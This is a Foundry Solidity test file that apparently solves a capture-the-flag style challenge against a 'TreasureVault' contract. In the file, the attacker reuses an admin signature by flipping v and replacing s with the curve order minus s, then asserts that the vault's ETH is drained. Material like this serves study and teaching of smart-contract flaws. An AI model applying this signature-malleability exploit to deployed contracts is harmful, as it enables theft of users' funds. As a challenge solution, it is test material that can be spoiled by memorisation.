// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// core contracts
import {TreasureVault} from "src/malleable/TreasureVault.sol";


contract Testing is Test {

    address attacker = makeAddr('attacker');
    address o1 = makeAddr('o1');
    address o2 = makeAddr('o2');
    uint256 adminPrivateKey = 111111; // should not be used
    address admin = vm.addr(adminPrivateKey); // should not be used
    address adminUser = makeAddr('adminUser'); // should not be used

    TreasureVault treasureVault;
    uint8 v;
    bytes32 r;
    bytes32 s;

    /// preliminary state
    function setUp() public {

        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);
        
        // deploying core contract
        vm.prank(admin);
        treasureVault = new TreasureVault();

        vm.prank(admin);
        payable(address(treasureVault)).transfer(2e18);

        // admin signs signature for adminUser to withdraw 1 ETH
        (v, r, s) = vm.sign(
            adminPrivateKey,
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    treasureVault.DOMAIN_SEPARATOR(),
                    keccak256(abi.encode(treasureVault.TYPEHASH(),1e18,0))
                )
            )
        );

        vm.prank(adminUser,adminUser); // tx.origin
        treasureVault.sendFundsWithAuth(1e18,0,v,r,s);

    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker,attacker);

        uint8 v_ = v == 27 ? 28 : 27;
        bytes32 s_ = bytes32(
            uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - 
            uint256(s)
        );

        treasureVault.sendFundsWithAuth(1e18,0,v_,r,s_);

        vm.stopPrank();
        validation();
    }

    /// expected final state
    function validation() public {

        // attacker drains ETH from contract
        assertGt(attacker.balance,10_000e18);
        assertEq(address(treasureVault).balance,0);

    }

}